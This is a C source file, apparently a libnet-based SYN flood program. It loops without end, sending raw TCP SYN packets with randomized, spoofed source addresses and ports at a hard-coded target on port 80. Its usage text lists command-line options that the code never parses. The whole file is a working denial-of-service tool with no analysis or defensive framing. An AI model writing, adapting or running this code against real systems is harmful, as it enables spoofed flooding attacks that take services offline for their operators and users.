/*
 *  $Id: synflood.c,v 1.1.1.1 2019/2/16 21:55:11 route Exp $
 *  $Author: Matthew Todd Jeremy Geiger
 */

#if (HAVE_CONFIG_H)
#include "../include/config.h"
#endif
#include <libnet.h>
#include "network.h"

struct t_pack
{
    struct libnet_ipv4_hdr ip;
    struct libnet_tcp_hdr tcp;
};

int main(int argc, char **argv)
{
    u_long dst_ip = 0;
    u_long src_ip = 0;
    u_short dst_prt = 80;
    u_short src_prt = 0;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    int c, build_ip;

    printf("libnet 1.1 syn flooding: TCP[raw]\n");

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
        LIBNET_RAW4, /* injection type */
        NULL,        /* network interface */
        errbuf);     /* error buffer */

    dst_ip = libnet_name2addr4(l, "192.168.1.3", LIBNET_RESOLVE);
    src_ip = libnet_name2addr4(l, "10.0.0.3", LIBNET_RESOLVE);

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE);
    }

    // Seed
    libnet_seed_prand(l);

    while (1)
    {

        t = libnet_build_tcp(
            src_prt = libnet_get_prand(LIBNET_PRu16),
            dst_prt,
            libnet_get_prand(LIBNET_PRu32),
            libnet_get_prand(LIBNET_PRu32),
            TH_SYN,
            libnet_get_prand(LIBNET_PRu16),
            0,
            0,
            LIBNET_TCP_H,
            NULL,
            0,
            l,
            t);
        build_ip = 0;

        libnet_build_ipv4(
            LIBNET_TCP_H + LIBNET_IPV4_H,
            0,
            libnet_get_prand(LIBNET_PRu16),
            0,
            libnet_get_prand(LIBNET_PR8),
            IPPROTO_TCP,
            0,
            src_ip = libnet_get_prand(LIBNET_PRu32),
            dst_ip,
            NULL,
            0,
            l,
            0);
        c = libnet_write(l);
        if (c == -1)
        {
            fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
        }

        printf("%15s:%5d ------> %15s:%5d\n",
               libnet_addr2name4(src_ip, 1),
               ntohs(src_prt),
               libnet_addr2name4(dst_ip, 1),
               dst_prt);
    }

    exit(EXIT_SUCCESS);
}

void usage(char *nomenclature)
{
    fprintf(stderr,
            "\n\nusage: %s -t -a [-i -b]\n"
            "\t-t target, (ip.address.port: 192.168.2.6.23)\n"
            "\t-a number of packets to send per burst\n"
            "\t-i packet burst sending interval (defaults to 0)\n"
            "\t-b number packet bursts to send (defaults to 1)\n",
            nomenclature);
}

/* EOF */